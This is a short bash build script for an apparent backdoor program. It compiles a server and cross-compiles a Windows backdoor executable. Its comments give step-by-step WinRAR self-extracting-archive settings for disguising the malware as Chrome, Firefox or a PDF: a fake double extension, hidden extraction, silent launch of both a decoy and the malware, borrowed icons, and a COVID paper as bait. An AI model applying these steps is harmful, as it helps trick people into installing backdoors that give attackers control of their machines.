#!/bin/bash

#compilation for backdoor program
#use Winrar to archive and mask program as chrome, firefox or pdf
#winrar steps:
## 1) create archive as SFX > label as <filename>.<extension_mask>.exe
## 2) under > Advanced Tab > select SFX Options > Setup tab > in field for Run After Extract, enter <filename_to_execute> & <malware_file>
## 3) under > Modes > select Unpack to Temp Folder & Hide All
## 4) under > Text and Icon > load sfx icon from file
## 5) under > Update > select Extract and Update & Overwrite All
#associated default shortcuts for browsers as found on Windows
#for pdf, used a covid paper

gcc server.c -o server
i686-w64-mingw32-gcc -o finalproduct.exe backdoor.c -lwsock32 -lwininet

